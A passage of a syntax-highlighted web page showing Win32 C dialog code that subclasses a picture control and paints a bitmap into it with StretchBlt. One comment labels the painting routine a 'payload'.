            </span><span class="sc11">dlgItemHnd</span><span class="sc10">=</span><span class="sc11">GetDlgItem</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc11">PHOTO</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">SetWindowLong</span><span class="sc10">(</span><span class="sc11">dlgItemHnd</span><span class="sc10">,</span><span class="sc11">GWL_WNDPROC</span><span class="sc10">,(</span><span class="sc11">LONG</span><span class="sc10">)</span><span class="sc11">MDialogProcPayPaint</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">WM_COMMAND</span><span class="sc10">:</span><span class="sc0">
            </span><span class="sc5">switch</span><span class="sc10">(</span><span class="sc11">wparam</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">IDOK</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc11">EndDialog</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0">
                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">
 </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc9">#pragma argsused
</span><span class="sc2">// this is my payload PLAGE dialog procedure to paint the picture
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">CALLBACK</span><span class="sc0">
</span><span class="sc11">MDialogProcPayPaint</span><span class="sc10">(</span><span class="sc11">HWND</span><span class="sc0"> </span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">UINT</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WPARAM</span><span class="sc0"> </span><span class="sc11">wparam</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPARAM</span><span class="sc0"> </span><span class="sc11">lparam</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc11">HDC</span><span class="sc0"> </span><span class="sc11">dc</span><span class="sc10">,</span><span class="sc11">dcMEM</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">RECT</span><span class="sc0"> </span><span class="sc11">rc</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">POINT</span><span class="sc0"> </span><span class="sc19">end</span><span class="sc10">;</span><span class="sc0">

 </span><span class="sc5">switch</span><span class="sc10">(</span><span class="sc11">msg</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">WM_PAINT</span><span class="sc10">:</span><span class="sc0">
            </span><span class="sc11">dc</span><span class="sc10">=</span><span class="sc11">GetDC</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">dcMEM</span><span class="sc10">=</span><span class="sc11">CreateCompatibleDC</span><span class="sc10">(</span><span class="sc11">dc</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">SetMapMode</span><span class="sc10">(</span><span class="sc11">dcMEM</span><span class="sc10">,</span><span class="sc11">GetMapMode</span><span class="sc10">(</span><span class="sc11">dc</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc11">SelectObject</span><span class="sc10">(</span><span class="sc11">dcMEM</span><span class="sc10">,</span><span class="sc11">bmp</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">GetWindowRect</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,&amp;</span><span class="sc11">rc</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc19">end</span><span class="sc10">.</span><span class="sc11">x</span><span class="sc10">=</span><span class="sc4">225</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// size of the image
</span><span class="sc0">            </span><span class="sc19">end</span><span class="sc10">.</span><span class="sc11">y</span><span class="sc10">=</span><span class="sc4">296</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">DPtoLP</span><span class="sc10">(</span><span class="sc11">dcMEM</span><span class="sc10">,&amp;</span><span class="sc19">end</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">StretchBlt</span><span class="sc10">(</span><span class="sc11">dc</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">rc</span><span class="sc10">.</span><span class="sc11">right</span><span class="sc10">-</span><span class="sc11">rc</span><span class="sc10">.</span><span class="sc11">left</span><span class="sc10">,</span><span class="sc11">rc</span><span class="sc10">.</span><span class="sc11">bottom</span><span class="sc10">-</span><span class="sc11">rc</span><span class="sc10">.</span><span class="sc11">top</span><span class="sc10">,</span><span class="sc0">
                          </span><span class="sc11">dcMEM</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc19">end</span><span class="sc10">.</span><span class="sc11">x</span><span class="sc10">,</span><span class="sc19">end</span><span class="sc10">.</span><span class="sc11">y</span><span class="sc10">,</span><span class="sc11">SRCCOPY</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">DeleteDC</span><span class="sc10">(</span><span class="sc11">dcMEM</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">

 </span><span class="sc10">}</span><span class="sc0">
 </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span></div></body>
</html>
